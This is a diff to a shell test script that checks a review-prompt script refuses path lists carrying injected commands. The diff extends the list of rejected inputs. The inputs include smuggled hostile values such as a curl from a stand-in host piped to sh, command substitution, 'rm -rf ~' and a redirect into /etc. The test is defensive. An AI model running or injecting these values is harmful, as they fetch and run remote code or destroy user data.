@@ -17,7 +17,8 @@ fail=0
 say(){ if [ "$2" = "$3" ]; then echo "  ok   $1"; else echo "  FAIL $1: got '$2' want '$3'"; fail=1; fi; }
 
 echo "== injected path lists must be refused =="
-for bad in 'src/a.py; curl evil.sh|sh' 'a $(id)' 'a `id`' 'a && rm -rf ~' 'a > /etc/x'; do
+for bad in 'src/a.py; curl evil.sh|sh' 'a $(id)' 'a `id`' 'a && rm -rf ~' 'a > /etc/x' \
+           'src :!docs' 'src ^docs' $'src\t:!docs' $'caf\xe9.py'; do
   bash "$TREE/scripts/review-prompt.sh" --target t --paths "$bad" >/dev/null 2>&1
   say "refused: $bad" "$?" "2"
 done
